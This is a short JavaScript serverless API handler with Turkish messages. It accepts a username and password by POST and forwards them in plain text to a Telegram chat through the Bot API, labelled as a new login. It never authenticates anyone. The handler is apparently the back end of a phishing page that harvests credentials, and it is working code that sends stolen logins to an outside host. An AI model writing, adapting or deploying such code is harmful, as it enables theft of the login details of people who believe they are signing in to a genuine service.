export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method Not Allowed" });
  }

  const { username, password } = req.body;

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    return res.status(500).json({ message: "Environment variables eksik." });
  }

  const text = `📥 Yeni Giriş\\n👤 Kullanıcı Adı: ${username}\\n🔐 Şifre: ${password}`;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        chat_id: CHAT_ID,
        text,
      }),
    });

    res.status(200).json({ message: "Gönderildi" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Hata oluştu" });
  }
}
